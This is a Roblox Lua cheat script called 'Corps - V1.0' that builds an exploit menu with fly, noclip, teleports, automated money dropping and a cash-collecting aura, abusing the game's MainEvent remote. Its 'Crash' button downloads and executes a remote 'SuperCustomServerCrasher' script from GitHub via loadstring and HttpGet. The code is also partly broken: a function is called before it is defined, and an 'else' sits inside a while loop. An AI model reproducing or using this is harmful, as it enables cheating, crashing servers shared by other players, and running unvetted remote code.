announce('Loaded Corps Selling Gui Successfully!', 5)
local Corps = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local nameexitlogo = Instance.new("Frame")
local corps = Instance.new("TextLabel")
local clear = Instance.new("ImageButton")
local c = Instance.new("TextLabel")
local TeleportsPage = Instance.new("ScrollingFrame")
local bank = Instance.new("TextButton")
local Secretare = Instance.new("TextButton")
local Train = Instance.new("TextButton")
local admin = Instance.new("TextButton")
local School = Instance.new("TextButton")
local BasketBall = Instance.new("TextButton")
local club = Instance.new("TextButton")
local Pages = Instance.new("ScrollingFrame")
local pageslabel = Instance.new("TextLabel")
local mainbtn = Instance.new("TextButton")
local plrbtn = Instance.new("TextButton")
local tpbtn = Instance.new("TextButton")
local Creditsbtn = Instance.new("TextButton")
local PlayerPage = Instance.new("Frame")
local Player = Instance.new("ImageLabel")
local plruser = Instance.new("TextBox")
local plrcash = Instance.new("TextLabel")
local tptoplr = Instance.new("TextButton")
local MainPage = Instance.new("ScrollingFrame")
local delcash = Instance.new("TextButton")
local speed = Instance.new("TextButton")
local autodrop = Instance.new("TextButton")
local Toggle = Instance.new("Frame")
local Crash = Instance.new("TextButton")
local fly = Instance.new("TextButton")
local noclip = Instance.new("TextButton")
local cashaura = Instance.new("TextButton")
local Toggle_2 = Instance.new("Frame")
local fpsbooster = Instance.new("TextButton")
local CreditsPage = Instance.new("Frame")
local credits = Instance.new("TextLabel")
local Credits2 = Instance.new("TextLabel")
local credits3 = Instance.new("TextLabel")

--Properties:

Corps.Name = "Corps"
Corps.Parent = game.CoreGui
Corps.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

MainFrame.Name = "MainFrame"
MainFrame.Parent = Corps
MainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
MainFrame.BorderColor3 = Color3.fromRGB(255, 255, 255)
MainFrame.BorderSizePixel = 0
MainFrame.Position = UDim2.new(0.151745051, 0, 0.294442415, 0)
MainFrame.Size = UDim2.new(0, 452, 0, 310)

nameexitlogo.Name = "nameexitlogo"
nameexitlogo.Parent = MainFrame
nameexitlogo.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
nameexitlogo.BorderSizePixel = 0
nameexitlogo.Position = UDim2.new(0.0154867256, 0, 0.0258064512, 0)
nameexitlogo.Size = UDim2.new(0, 437, 0, 41)

corps.Name = "corps"
corps.Parent = nameexitlogo
corps.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
corps.BackgroundTransparency = 1.000
corps.Position = UDim2.new(0.311212808, 0, -0.073170729, 0)
corps.Size = UDim2.new(0, 165, 0, 44)
corps.Font = Enum.Font.GothamSemibold
corps.Text = "Corps - V1.0"
corps.TextColor3 = Color3.fromRGB(203, 203, 203)
corps.TextSize = 21.000

clear.Name = "clear"
clear.Parent = nameexitlogo
clear.BackgroundTransparency = 1.000
clear.LayoutOrder = 5
clear.Position = UDim2.new(0.923340976, 0, 0.155764982, 0)
clear.Size = UDim2.new(0, 25, 0, 25)
clear.ZIndex = 2
clear.Image = "rbxassetid://3926305904"
clear.ImageColor3 = Color3.fromRGB(203, 203, 203)
clear.ImageRectOffset = Vector2.new(924, 724)
clear.ImageRectSize = Vector2.new(36, 36)

c.Name = "c"
c.Parent = nameexitlogo
c.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
c.BackgroundTransparency = 1.000
c.Position = UDim2.new(-0.144164756, 0, -0.097560972, 0)
c.Size = UDim2.new(0, 165, 0, 44)
c.Font = Enum.Font.Arcade
c.Text = "C"
c.TextColor3 = Color3.fromRGB(203, 203, 203)
c.TextSize = 35.000

TeleportsPage.Name = "TeleportsPage"
TeleportsPage.Parent = MainFrame
TeleportsPage.Active = true
TeleportsPage.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
TeleportsPage.BorderSizePixel = 0
TeleportsPage.Position = UDim2.new(0.345132738, 0, 0.183870971, 0)
TeleportsPage.Size = UDim2.new(0, 288, 0, 239)
TeleportsPage.Visible = false
TeleportsPage.ScrollBarThickness = 4

bank.Name = "bank"
bank.Parent = TeleportsPage
bank.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
bank.BorderSizePixel = 0
bank.Position = UDim2.new(0.0416666679, 0, 0.00885409862, 0)
bank.Size = UDim2.new(0, 264, 0, 39)
bank.Font = Enum.Font.GothamBold
bank.Text = "Bank"
bank.TextColor3 = Color3.fromRGB(203, 203, 203)
bank.TextSize = 14.000

Secretare.Name = "Secretare"
Secretare.Parent = TeleportsPage
Secretare.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Secretare.BorderSizePixel = 0
Secretare.Position = UDim2.new(0.0416666679, 0, 0.0814347416, 0)
Secretare.Size = UDim2.new(0, 264, 0, 39)
Secretare.Font = Enum.Font.GothamBold
Secretare.Text = "Secret Area"
Secretare.TextColor3 = Color3.fromRGB(203, 203, 203)
Secretare.TextSize = 14.000

Train.Name = "Train"
Train.Parent = TeleportsPage
Train.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Train.BorderSizePixel = 0
Train.Position = UDim2.new(0.0419999994, 0, 0.152999997, 0)
Train.Size = UDim2.new(0, 264, 0, 39)
Train.Font = Enum.Font.GothamBold
Train.Text = "Train Station"
Train.TextColor3 = Color3.fromRGB(203, 203, 203)
Train.TextSize = 14.000

admin.Name = "admin"
admin.Parent = TeleportsPage
admin.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
admin.BorderSizePixel = 0
admin.Position = UDim2.new(0.0390000008, 0, 0.224999994, 0)
admin.Size = UDim2.new(0, 264, 0, 39)
admin.Font = Enum.Font.GothamBold
admin.Text = "Admin Base"
admin.TextColor3 = Color3.fromRGB(203, 203, 203)
admin.TextSize = 14.000

School.Name = "School"
School.Parent = TeleportsPage
School.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
School.BorderSizePixel = 0
School.Position = UDim2.new(0.0359999985, 0, 0.296999991, 0)
School.Size = UDim2.new(0, 264, 0, 39)
School.Font = Enum.Font.GothamBold
School.Text = "School"
School.TextColor3 = Color3.fromRGB(203, 203, 203)
School.TextSize = 14.000

BasketBall.Name = "BasketBall"
BasketBall.Parent = TeleportsPage
BasketBall.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
BasketBall.BorderSizePixel = 0
BasketBall.Position = UDim2.new(0.0359999985, 0, 0.368999988, 0)
BasketBall.Size = UDim2.new(0, 264, 0, 39)
BasketBall.Font = Enum.Font.GothamBold
BasketBall.Text = "Basket Ball"
BasketBall.TextColor3 = Color3.fromRGB(203, 203, 203)
BasketBall.TextSize = 14.000

club.Name = "club"
club.Parent = TeleportsPage
club.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
club.BorderSizePixel = 0
club.Position = UDim2.new(0.0359999985, 0, 0.441000015, 0)
club.Size = UDim2.new(0, 264, 0, 39)
club.Font = Enum.Font.GothamBold
club.Text = "Club"
club.TextColor3 = Color3.fromRGB(203, 203, 203)
club.TextSize = 14.000

Pages.Name = "Pages"
Pages.Parent = MainFrame
Pages.Active = true
Pages.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
Pages.BorderSizePixel = 0
Pages.Position = UDim2.new(0.0199115053, 0, 0.183870971, 0)
Pages.Size = UDim2.new(0, 140, 0, 239)
Pages.ScrollBarThickness = 4

pageslabel.Name = "pageslabel"
pageslabel.Parent = Pages
pageslabel.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
pageslabel.BorderSizePixel = 0
pageslabel.Position = UDim2.new(0.0528784618, 0, 0.00979625992, 0)
pageslabel.Size = UDim2.new(0, 124, 0, 26)
pageslabel.Font = Enum.Font.GothamBold
pageslabel.Text = "Pages"
pageslabel.TextColor3 = Color3.fromRGB(255, 255, 255)
pageslabel.TextSize = 14.000

mainbtn.Name = "mainbtn"
mainbtn.Parent = Pages
mainbtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
mainbtn.BorderSizePixel = 0
mainbtn.Position = UDim2.new(0.0528784618, 0, 0.0642478168, 0)
mainbtn.Size = UDim2.new(0, 124, 0, 39)
mainbtn.Font = Enum.Font.GothamBold
mainbtn.Text = "Main Page"
mainbtn.TextColor3 = Color3.fromRGB(203, 203, 203)
mainbtn.TextSize = 14.000

plrbtn.Name = "plrbtn"
plrbtn.Parent = Pages
plrbtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
plrbtn.BorderSizePixel = 0
plrbtn.Position = UDim2.new(0.0528784618, 0, 0.144892976, 0)
plrbtn.Size = UDim2.new(0, 124, 0, 39)
plrbtn.Font = Enum.Font.GothamBold
plrbtn.Text = "Player Page"
plrbtn.TextColor3 = Color3.fromRGB(203, 203, 203)
plrbtn.TextSize = 14.000

tpbtn.Name = "tpbtn"
tpbtn.Parent = Pages
tpbtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
tpbtn.BorderSizePixel = 0
tpbtn.Position = UDim2.new(0.0528784618, 0, 0.228763938, 0)
tpbtn.Size = UDim2.new(0, 124, 0, 39)
tpbtn.Font = Enum.Font.GothamBold
tpbtn.Text = "Teleports Page"
tpbtn.TextColor3 = Color3.fromRGB(203, 203, 203)
tpbtn.TextSize = 14.000

Creditsbtn.Name = "Creditsbtn"
Creditsbtn.Parent = Pages
Creditsbtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Creditsbtn.BorderSizePixel = 0
Creditsbtn.Position = UDim2.new(0.0528784618, 0, 0.309409082, 0)
Creditsbtn.Size = UDim2.new(0, 124, 0, 39)
Creditsbtn.Font = Enum.Font.GothamBold
Creditsbtn.Text = "Credits Page"
Creditsbtn.TextColor3 = Color3.fromRGB(203, 203, 203)
Creditsbtn.TextSize = 14.000

PlayerPage.Name = "PlayerPage"
PlayerPage.Parent = MainFrame
PlayerPage.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
PlayerPage.BorderSizePixel = 0
PlayerPage.Position = UDim2.new(0.345132738, 0, 0.183870971, 0)
PlayerPage.Size = UDim2.new(0, 287, 0, 239)
PlayerPage.Visible = false

Player.Name = "Player"
Player.Parent = PlayerPage
Player.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Player.BackgroundTransparency = 1.000
Player.Position = UDim2.new(0.348432064, 0, 0.0254128426, 0)
Player.Size = UDim2.new(0, 84, 0, 65)
Player.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"

plruser.Name = "plruser"
plruser.Parent = PlayerPage
plruser.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
plruser.BorderSizePixel = 0
plruser.Position = UDim2.new(0.243902445, 0, 0.343096226, 0)
plruser.Size = UDim2.new(0, 146, 0, 31)
plruser.Font = Enum.Font.GothamBold
plruser.PlaceholderColor3 = Color3.fromRGB(197, 197, 197)
plruser.PlaceholderText = "Player User..."
plruser.Text = ""
plruser.TextColor3 = Color3.fromRGB(222, 222, 222)
plruser.TextSize = 14.000

plrcash.Name = "plrcash"
plrcash.Parent = PlayerPage
plrcash.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
plrcash.BackgroundTransparency = 1.000
plrcash.Position = UDim2.new(0.0487804562, 0, 0.824267685, 0)
plrcash.Size = UDim2.new(0, 128, 0, 33)
plrcash.Font = Enum.Font.GothamBold
plrcash.Text = "Player Cash : NULL"
plrcash.TextColor3 = Color3.fromRGB(213, 213, 213)
plrcash.TextSize = 14.000

tptoplr.Name = "tptoplr"
tptoplr.Parent = PlayerPage
tptoplr.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
tptoplr.BorderSizePixel = 0
tptoplr.Position = UDim2.new(0.296780884, 0, 0.501396, 0)
tptoplr.Size = UDim2.new(0, 115, 0, 30)
tptoplr.Font = Enum.Font.GothamBold
tptoplr.Text = "Go To Player"
tptoplr.TextColor3 = Color3.fromRGB(203, 203, 203)
tptoplr.TextSize = 14.000

MainPage.Name = "MainPage"
MainPage.Parent = MainFrame
MainPage.Active = true
MainPage.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
MainPage.BorderSizePixel = 0
MainPage.Position = UDim2.new(0.345132738, 0, 0.183870971, 0)
MainPage.Size = UDim2.new(0, 288, 0, 239)
MainPage.ScrollBarThickness = 4

delcash.Name = "delcash"
delcash.Parent = MainPage
delcash.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
delcash.BorderSizePixel = 0
delcash.Position = UDim2.new(0.0416666679, 0, 0.389499247, 0)
delcash.Size = UDim2.new(0, 264, 0, 39)
delcash.Font = Enum.Font.GothamBold
delcash.Text = "Delete Cash[FOR FPS]"
delcash.TextColor3 = Color3.fromRGB(203, 203, 203)
delcash.TextSize = 14.000

speed.Name = "speed"
speed.Parent = MainPage
speed.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
speed.BorderSizePixel = 0
speed.Position = UDim2.new(0.0416666679, 0, 0.310467005, 0)
speed.Size = UDim2.new(0, 264, 0, 39)
speed.Font = Enum.Font.GothamBold
speed.Text = "Speed[Z]"
speed.TextColor3 = Color3.fromRGB(203, 203, 203)
speed.TextSize = 14.000
speed.Visible = false

autodrop.Name = "autodrop"
autodrop.Parent = MainPage
autodrop.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
autodrop.BorderSizePixel = 0
autodrop.Position = UDim2.new(0.0415833332, 0, 0.471677482, 0)
autodrop.Size = UDim2.new(0, 264, 0, 39)
autodrop.Font = Enum.Font.GothamBold
autodrop.Text = "Auto Drop"
autodrop.TextColor3 = Color3.fromRGB(203, 203, 203)
autodrop.TextSize = 14.000

Toggle.Name = "Toggle"
Toggle.Parent = autodrop
Toggle.BackgroundColor3 = Color3.fromRGB(198, 0, 0)
Toggle.BorderSizePixel = 0
Toggle.Position = UDim2.new(0.9375, 0, 0, 0)
Toggle.Size = UDim2.new(0, 16, 0, 39)

Crash.Name = "Crash"
Crash.Parent = MainPage
Crash.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Crash.BorderSizePixel = 0
Crash.Position = UDim2.new(0.0416666679, 0, 0.157241181, 0)
Crash.Size = UDim2.new(0, 264, 0, 39)
Crash.Font = Enum.Font.GothamBold
Crash.Text = "Crash"
Crash.TextColor3 = Color3.fromRGB(203, 203, 203)
Crash.TextSize = 14.000

fly.Name = "fly"
fly.Parent = MainPage
fly.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
fly.BorderSizePixel = 0
fly.Position = UDim2.new(0.0416666679, 0, 0.00885409862, 0)
fly.Size = UDim2.new(0, 264, 0, 39)
fly.Font = Enum.Font.GothamBold
fly.Text = "Fly[X]"
fly.TextColor3 = Color3.fromRGB(203, 203, 203)
fly.TextSize = 14.000

noclip.Name = "noclip"
noclip.Parent = MainPage
noclip.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
noclip.BorderSizePixel = 0
noclip.Position = UDim2.new(0.0416666679, 0, 0.0830476433, 0)
noclip.Size = UDim2.new(0, 264, 0, 39)
noclip.Font = Enum.Font.GothamBold
noclip.Text = "NoClip[K]"
noclip.TextColor3 = Color3.fromRGB(203, 203, 203)
noclip.TextSize = 14.000

cashaura.Name = "cashaura"
cashaura.Parent = MainPage
cashaura.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
cashaura.BorderSizePixel = 0
cashaura.Position = UDim2.new(0.0385277756, 0, 0.55212909, 0)
cashaura.Size = UDim2.new(0, 264, 0, 39)
cashaura.Font = Enum.Font.GothamBold
cashaura.Text = "Cash Aura"
cashaura.TextColor3 = Color3.fromRGB(203, 203, 203)
cashaura.TextSize = 14.000

Toggle_2.Name = "Toggle"
Toggle_2.Parent = cashaura
Toggle_2.BackgroundColor3 = Color3.fromRGB(198, 0, 0)
Toggle_2.BorderSizePixel = 0
Toggle_2.Position = UDim2.new(0.9375, 0, 0, 0)
Toggle_2.Size = UDim2.new(0, 16, 0, 39)

fpsbooster.Name = "fpsbooster"
fpsbooster.Parent = MainPage
fpsbooster.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
fpsbooster.BorderSizePixel = 0
fpsbooster.Position = UDim2.new(0.0416666679, 0, 0.233047649, 0)
fpsbooster.Size = UDim2.new(0, 264, 0, 39)
fpsbooster.Font = Enum.Font.GothamBold
fpsbooster.Text = "Fps Booster"
fpsbooster.TextColor3 = Color3.fromRGB(203, 203, 203)
fpsbooster.TextSize = 14.000

CreditsPage.Name = "CreditsPage"
CreditsPage.Parent = MainFrame
CreditsPage.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
CreditsPage.BorderSizePixel = 0
CreditsPage.Position = UDim2.new(0.345132738, 0, 0.183870971, 0)
CreditsPage.Size = UDim2.new(0, 287, 0, 239)
CreditsPage.Visible = false

credits.Name = "credits"
credits.Parent = CreditsPage
credits.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
credits.BackgroundTransparency = 1.000
credits.Position = UDim2.new(0.283017933, 0, 0.263764411, 0)
credits.Size = UDim2.new(0, 124, 0, 26)
credits.Font = Enum.Font.GothamBold
credits.Text = "Scripting - zay.#6666"
credits.TextColor3 = Color3.fromRGB(255, 255, 255)
credits.TextSize = 14.000

Credits2.Name = "Credits2"
Credits2.Parent = CreditsPage
Credits2.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
Credits2.BackgroundTransparency = 1.000
Credits2.Position = UDim2.new(0.283017933, 0, 0.372551024, 0)
Credits2.Size = UDim2.new(0, 124, 0, 26)
Credits2.Font = Enum.Font.GothamBold
Credits2.Text = "UI - zay.#6666"
Credits2.TextColor3 = Color3.fromRGB(255, 255, 255)
Credits2.TextSize = 14.000

credits3.Name = "credits3"
credits3.Parent = CreditsPage
credits3.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
credits3.BackgroundTransparency = 1.000
credits3.Position = UDim2.new(0.283017933, 0, 0.481337637, 0)
credits3.Size = UDim2.new(0, 124, 0, 26)
credits3.Font = Enum.Font.GothamBold
credits3.Text = "Custom Made For - Night#0009"
credits3.TextColor3 = Color3.fromRGB(255, 255, 255)
credits3.TextSize = 14.000

getgenv().AutoDrop = false
getgenv().CashAura = false
local player = game.Players.LocalPlayer

local Mouse = game.Players.LocalPlayer:GetMouse()
local Closed = true
Mouse.KeyDown:connect(function(key)

	if key == "v" then
		if Closed == true then
			Closed = false
			Corps.Enabled = false
		else
			Closed = true
			Corps.Enabled = true
		end
	end
end)

function SetPlayerInfo()
	local plrr = game:GetService('Players'):FindFirstChild(plruser.Text)
	if plrr then
		local playerid = plrr.UserId
		local ThumbType = Enum.ThumbnailType.HeadShot
		local ThumbSize = Enum.ThumbnailSize.Size420x420
		local Content, IsReady = game:GetService('Players'):GetUserThumbnailAsync(playerid, ThumbType, ThumbSize)

		script.Parent.Player.Image = Content
    end
end

function ShrinkName()
	plruser.FocusLost:connect(function()
		for i,v in pairs(game.Players:GetChildren()) do
			if (string.sub(string.lower(v.Name),1,string.len(plruser.Text))) == string.lower(plruser.Text) then
				plruser.Text = v.Name
				SetPlayerInfo()
			end
		end
	end)
end
ShrinkName()


tptoplr.MouseButton1Click:Connect(function()
	player.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players[plruser.Text].Character.UpperTorso.Position)
end)


clear.MouseButton1Click:Connect(function()
	Corps:Destroy()
end)


function announce(txt,timer)
	game.StarterGui:SetCore("SendNotification", {Title = "Corps - V1.0", Text = txt, Duration = timer})
end

function hideframes()
	CreditsPage.Visible = false
	MainPage.Visible = false
	PlayerPage.Visible = false
	TeleportsPage.Visible = false
end

Creditsbtn.MouseButton1Click:Connect(function()
	CreditsPage.Visible = true
	hideframes()
end)

mainbtn.MouseButton1Click:Connect(function()
	MainPage.Visible = true
	hideframes()
end)

plrbtn.MouseButton1Click:Connect(function()
	PlayerPage.Visible = true
	hideframes()
end)

tpbtn.MouseButton1Click:Connect(function()
	TeleportsPage.Visible = true
	hideframes()
end)


Crash.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
end)

autodrop.MouseButton1Click:Connect(function()
	getgenv().AutoDrop = true
	Toggle.BackgroundColor3 = Color3.fromRGB(59, 217, 31)
    announce('CORPS - V1.0 [ STARTED TO DROP! ] ', 5)
	while getgenv().AutoDrop do
		if not getgenv().AutoDrop then break end
		game:GetService("ReplicatedStorage").MainEvent:FireServer("DropMoney", "10000")
		task.wait()
		else 
	getgenv().AutoDrop = false
    announce('CORPS - V1.0 [ STOPPED DROPPING! ] ', 5)
	Toggle.BackgroundColor3 = Color3.fromRGB(198, 0, 0)
	   end
	end
end)

cashaura.MouseButton1Click:Connect(function()
	getgenv().CashAura = true
    announce('CORPS - V1.0 [ STARTED CASH AURA! ] ', 5)
	Toggle_2.BackgroundColor3 = Color3.fromRGB(59, 217, 31)
	local RenderConnection
	RenderConnection = game:GetService"RunService".RenderStepped:Connect(function(deltaTime)
		if getgenv().CashAura == false or not getgenv().CashAura then RenderConnection:Disconnect() end
		for _, v in pairs(Workspace.Ignored.Drop:GetChildren()) do
			if v.Name == "MoneyDrop" then
				local MoneyMagnitude = (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude
				if MoneyMagnitude < 25 then
					fireclickdetector(v.ClickDetector)
				else 
					getgenv().CashAura = false
                    announce('CORPS - V1.0 [ STOPPED CASH AURA! ] ', 5)
					Toggle_2.BackgroundColor3 = Color3.fromRGB(198, 0, 0)
				end 
			end
		end
	end)
end)

delcash.MouseButton1Click:Connect(function()
	for i, v in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
		if v.Name == "MoneyDrop" then
			v:Destroy()
            announce('CORPS - V1.0 [ DELETED CASH ON GROUND SUCCESSFULLY! ] ', 5)
        end
    end
end)

FLYSPEED = '40'
fly.MouseButton1Click:Connect(function()
	local plr = game.Players.LocalPlayer
	local Humanoid = plr.Character:FindFirstChildWhichIsA('Humanoid')
	local mouse = plr:GetMouse()
	localplayer = plr
	if workspace:FindFirstChild("Core") then
		workspace.Core:Destroy()
	end
	local Core = Instance.new("Part")
	Core.Name = "Core"
	Core.Size = Vector3.new(0.05, 0.05, 0.05)
	spawn(function()
		Core.Parent = workspace
		local Weld = Instance.new("Weld", Core)
		Weld.Part0 = Core
		Weld.Part1 = localplayer.Character.LowerTorso
		Weld.C0 = CFrame.new(0, 0, 0)
	end)
	workspace:WaitForChild("Core")
	local torso = workspace.Core
	flying = true
	local speed=FLYSPEED
	local keys={a=false,d=false,w=false,s=false}
	local e1
	local e2
	local function start()
		local pos = Instance.new("BodyPosition",torso)
		local gyro = Instance.new("BodyGyro",torso)
		pos.Name="EPIXPOS"
		pos.maxForce = Vector3.new(math.huge, math.huge, math.huge)
		pos.position = torso.Position
		gyro.maxTorque = Vector3.new(15e15, 15e15, 15e15)
		gyro.cframe = torso.CFrame
		repeat
			wait()
			Humanoid.PlatformStand=true
			local new=gyro.cframe - gyro.cframe.p + pos.position
			if not keys.w and not keys.s and not keys.a and not keys.d then
				speed=FLYSPEED
			end
			if keys.w then
				new = new + workspace.CurrentCamera.CoordinateFrame.lookVector * speed
				speed=speed
			end
			if keys.s then
				new = new - workspace.CurrentCamera.CoordinateFrame.lookVector * speed
				speed=speed
			end
			if keys.d then
				new = new * CFrame.new(speed,0,0)
				speed=speed
			end
			if keys.a then
				new = new * CFrame.new(-speed,0,0)
				speed=speed
			end
			if speed>FLYSPEED then
				speed=FLYSPEED
			end
			pos.position=new.p
			if keys.w then
				gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(-math.rad(speed),0,0)
			elseif keys.s then
				gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(math.rad(speed),0,0)
			else
				gyro.cframe = workspace.CurrentCamera.CoordinateFrame
			end
		until flying == false
		if gyro then gyro:Destroy() end
		if pos then pos:Destroy() end
		flying=false
		Humanoid.PlatformStand=false
		speed=FLYSPEED
	end
	e1=mouse.KeyDown:connect(function(key)
		if not torso or not torso.Parent then flying=false e1:disconnect() e2:disconnect() return end
		if key=="w" then
			keys.w=true
		elseif key=="s" then
			keys.s=true
		elseif key=="a" then
			keys.a=true
		elseif key=="d" then
			keys.d=true
		elseif key=="x" then
			if flying==true then
				flying=false
			else
				flying=true
				start()
			end
		end
	end)
	e2=mouse.KeyUp:connect(function(key)
		if key=="w" then
			keys.w=false
		elseif key=="s" then
			keys.s=false
		elseif key=="a" then
			keys.a=false
		elseif key=="d" then
			keys.d=false
		end
	end)
	start()
end)


fpsbooster.MouseButton1Click:Connect(function()
	local decalsyeeted = true -- Leaving this on makes games look shitty but the fps goes up by at least 20.
	local g = game
	local w = g.Workspace
	local l = g.Lighting
	local t = w.Terrain
	t.WaterWaveSize = 0
	t.WaterWaveSpeed = 0
	t.WaterReflectance = 0
	t.WaterTransparency = 0
	l.GlobalShadows = false
	l.FogEnd = 9e9
	l.Brightness = 0
	settings().Rendering.QualityLevel = "Level01"
	for i, v in pairs(g:GetDescendants()) do
		if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
			v.Material = "Plastic"
			v.Reflectance = 0
		elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
			v.Transparency = 1
		elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
			v.Lifetime = NumberRange.new(0)
		elseif v:IsA("Explosion") then
			v.BlastPressure = 1
			v.BlastRadius = 1
		elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
			v.Enabled = false
		elseif v:IsA("MeshPart") then
			v.Material = "Plastic"
			v.Reflectance = 0
			v.TextureID = 10385902758728957
		end
	end
	for i, e in pairs(l:GetChildren()) do
		if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
			e.Enabled = false
		end
	end
end)
local player = game.Players.LocalPlayer
local OldState = player.Character:FindFirstChildWhichIsA('Humanoid'):GetState()
noclip.MouseButton1Click:Connect(function()
	local Character = player.Character
	local Humanoid = Character:FindFirstChildWhichIsA('Humanoid')
	local Control = false
	local loopFunction = function()
		Humanoid:ChangeState(11)
	end;
	local Loop
	local Start = function()
		if Control == false then
			Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
		end
	end;
	local Ended = function()
		if Control == true then
			Humanoid:ChangeState(OldState)
		end
	end;
	Start()	
	local Pause = function()
		Loop:Disconnect()
	end;
	local Pause2 = function()
		Start();
		Loop2:Disconnect()
	end;
    game:GetService('UserInputService').InputBegan:Connect(function(a, b)
		if a.KeyCode == Enum.KeyCode.Z and not b then
			if Control == false then
				Control = true;
				Ended();
				Pause();
			elseif Control == true then
				Control = false;
				Pause2();
			end;
		end;
	end);	
end)


BasketBall.MouseButton1Click:Connect(function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-932.590027, 22.1000004, -482.179993, 1, 0, 0, 0, 1, 0, 0, 0, 1)
end)

Secretare.MouseButton1Click:Connect(function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(212.649994, 38.25, 200025.781, 1, 0, 0, 0, 1, 0, 0, 0, 1)
end)

bank.MouseButton1Click:Connect(function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-373.86322, 21.2499924, -361.275085, -0.99976486, 1.24181847e-08, 0.0216846075, 1.37329135e-08, 1, 6.04806658e-08, -0.0216846075, 6.07642363e-08, -0.99976486)
end)

admin.MouseButton1Click:Connect(function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-872.400024, -38.1699982, -584.059998, 1, 0, 0, 0, 1, 0, 0, 0, 1)    
end)

School.MouseButton1Click:Connect(function()
    
end)

Train.MouseButton1Click:Connect(function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(644.049988, 48, -70.8600006, 1, 0, 0, 0, 1, 0, 0, 0, 1)
end)

club.MouseButton1Click:Connect(function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-266.321289, -6.20834732, -375.963867, 1, 0, 0, 0, 1, 0, 0, 0, 1)
end)
